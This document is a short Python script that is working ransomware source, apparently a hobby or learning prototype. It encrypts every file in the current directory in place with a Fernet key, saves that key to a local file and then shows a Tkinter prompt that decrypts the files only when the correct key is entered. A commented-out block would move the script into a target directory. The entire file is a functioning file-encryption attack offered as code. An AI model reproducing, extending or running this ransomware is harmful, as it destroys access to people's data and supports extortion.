import os
import shutil

from tkinter import *
from email.message import EmailMessage
from cryptography.fernet import Fernet




# Planting myself in target directory

#origin = os.path.abspath(__file__)
#target = r'/home/vigil/Desktop/exp_zone'

#shutil.move(origin, target)




# Tracking down files

files = []

for file in os.listdir():
    if file == 'Ransom_Encrypt.py' or file == 'unlock.key' or file == 'Decrypt.py':
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)




# Key generation and encryption

key = Fernet.generate_key()

print(key)

with open('unlock.key', 'wb') as unlock:
    unlock.write(key)

for file in files:
    with open(file, 'rb') as thefile:
        contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, 'wb') as thefile:
        thefile.write(contents_encrypted)

print('--- All Files Have Been ENCRYPTED ---')



# Ask for key

root = Tk()
prompt = Label(text='Enter Key: ', font=40)
prompt.grid(row=0, column=0)

usr = Entry(root, font=('Arial Black', 12))
usr.grid(row=0, column=0)

def deCrypt():
    string = usr.get()
    usrKey = bytes(string, 'utf-8')
    print(usrKey)

    if usrKey == key:

        # Decryption process

        for file in files:
            with open(file, 'rb') as thefile:
                contents = thefile.read()
            contents_decrypted = Fernet(key).decrypt(contents)
            with open(file, 'wb') as thefile:
                thefile.write(contents_decrypted)

        print('--- All Files Have Been DECRYPTED ---')
    
    else:
        nomatch = Label(text='Incorrect key.', font=40)
        nomatch.grid(row=3, column=1)

enter = Button(root, text='Submit', font=40, command=deCrypt)
enter.grid(row=2, column=1)

root.mainloop()
